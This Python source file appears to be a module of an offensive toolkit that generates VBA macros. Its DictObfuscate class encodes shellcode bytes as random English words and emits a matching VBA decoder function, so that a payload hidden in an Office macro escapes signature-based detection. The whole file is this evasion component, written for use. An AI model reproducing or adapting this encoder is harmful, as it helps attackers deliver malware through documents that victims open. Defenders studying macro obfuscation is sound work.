import random
import string
import time
from vba.utils.formatters import dict_to_vba

class DictObfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'seed' in arguments:
            self.rng = random.Random(arguments['seed'])
        else:
            self.rng = random.Random(time.time())
        self.dictencode = {}
        self.dictdecode = {}
        wordlist = open('wordlists/english.txt', 'r').readlines()
        randomNumbers = random.sample(range(0, len(wordlist)), 256)
        for i in range(0, 256):
            word = wordlist[randomNumbers[i]].strip()
            self.dictencode[i] = word
            self.dictdecode[word] = i

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> str:
        encoded = []
        self.length = len(decoded)
        for i in range(0, len(decoded)):
            encoded.append(self.dictencode[decoded[i]])
        return ' '.join(encoded)

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
Private Function {self.name}(strData)
    {dict_to_vba(self.dictdecode, 'dictionary')}
    Dim outArray({self.length} - 1) As Byte
    
    Dim words() As String

    words = Split(strData, " ")
    For i=0 To {self.length} - 1
        outArray(i) = dictionary.Item(words(i))
    Next i

    {self.name} = outArray
End Function
"""